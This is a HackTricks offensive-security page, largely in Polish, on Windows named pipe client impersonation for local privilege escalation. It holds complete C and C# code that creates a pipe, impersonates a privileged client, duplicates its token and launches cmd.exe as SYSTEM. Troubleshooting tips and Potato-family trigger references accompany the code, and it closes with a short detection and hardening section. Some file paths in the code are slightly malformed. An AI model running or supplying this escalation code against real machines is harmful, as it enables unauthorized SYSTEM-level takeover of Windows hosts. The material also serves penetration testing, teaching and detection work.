# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation to lokalna metoda/ prymityw eskalacji uprawnień lokalnych, która pozwala wątkowi serwera named-pipe przyjąć kontekst bezpieczeństwa klienta, który się z nim łączy. W praktyce atakujący, który może uruchamiać kod z SeImpersonatePrivilege, może zmusić uprzywilejowanego klienta (np. usługę SYSTEM) do połączenia z rurą kontrolowaną przez atakującego, wywołać ImpersonateNamedPipeClient, zduplikować powstały token na token główny i uruchomić proces jako klient (często NT AUTHORITY\SYSTEM).

Ta strona koncentruje się na samej technice. Dla kompletnych łańcuchów exploitów, które zmuszają SYSTEM do połączenia z twoją rurą, zobacz strony z rodziny Potato wymienione poniżej.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Spraw, by uprzywilejowany komponent połączył się z nim (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Wymagania i kluczowe API
- Uprawnienia zazwyczaj wymagane przez proces/wątek wywołujący:
  - SeImpersonatePrivilege, aby poprawnie zaimpsonować łączącego się klienta oraz aby użyć CreateProcessWithTokenW.
  - Alternatywnie, po zaimpsonowaniu SYSTEM, można użyć CreateProcessAsUser, co może wymagać SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (te są spełnione, gdy impersonujesz SYSTEM).
- Kluczowe API używane:
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (należy odczytać przynajmniej jedną wiadomość przed impersonacją)
  - ImpersonateNamedPipeClient i RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW lub CreateProcessAsUser
- Impersonation level: aby wykonywać przydatne działania lokalnie, klient musi pozwolić na SecurityImpersonation (domyślnie dla wielu lokalnych RPC/named-pipe klientów). Klienci mogą obniżyć to za pomocą SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION przy otwieraniu pipe'a.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Uwagi:
- Jeśli ImpersonateNamedPipeClient zwraca ERROR_CANNOT_IMPERSONATE (1368), upewnij się, że najpierw odczytasz dane z potoku i że klient nie ograniczył impersonacji do Identification level.
- Preferuj DuplicateTokenEx z SecurityImpersonation i TokenPrimary, aby utworzyć primary token odpowiedni do tworzenia procesu.

## .NET — szybki przykład
W .NET NamedPipeServerStream może wykonać impersonację za pomocą RunAsClient. Po rozpoczęciu impersonacji zdubluj thread token i utwórz proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Typowe wyzwalacze/przymuszenia, aby dostać SYSTEM na swój pipe
Te techniki zmuszają uprzywilejowane usługi do połączenia się z twoim named pipe, abyś mógł je impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Rozwiązywanie problemów i uwagi
- Musisz odczytać co najmniej jedną wiadomość z pipe przed wywołaniem ImpersonateNamedPipeClient; w przeciwnym razie otrzymasz ERROR_CANNOT_IMPERSONATE (1368).
- Jeśli klient łączy się z SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, serwer nie może w pełni impersonate; sprawdź poziom impersonacji tokena przez GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW wymaga SeImpersonatePrivilege u wywołującego. Jeśli to kończy się ERROR_PRIVILEGE_NOT_HELD (1314), użyj CreateProcessAsUser po tym, jak już impersonowałeś SYSTEM.
- Upewnij się, że security descriptor twojego pipe pozwala docelowemu serwisowi na połączenie, jeśli go utwardzasz; domyślnie pipe'y pod \\.\pipe są dostępne zgodnie z DACL serwera.

## Wykrywanie i utwardzanie
- Monitoruj tworzenie i połączenia named pipe. Sysmon Event IDs 17 (Pipe Created) i 18 (Pipe Connected) są przydatne do ustalenia bazy legalnych nazw pipe i wykrywania nietypowych, losowo wyglądających pipe'ów poprzedzających zdarzenia związane z manipulacją tokenami.
- Szukaj sekwencji: proces tworzy pipe, usługa SYSTEM łączy się, następnie proces tworzący uruchamia potomka jako SYSTEM.
- Zmniejsz ekspozycję przez usunięcie SeImpersonatePrivilege z nieistotnych kont usług i unikanie niepotrzebnych logowań usług z wysokimi uprawnieniami.
- Bezpieczny development: podczas łączenia się z niezaufanymi named pipe określ SECURITY_SQOS_PRESENT z SECURITY_IDENTIFICATION, aby zapobiec pełnemu impersonowaniu klienta przez serwer, chyba że jest to konieczne.

## Referencje
- Windows: dokumentacja ImpersonateNamedPipeClient (wymagania i zachowanie impersonacji). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (przewodnik i przykłady kodu). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
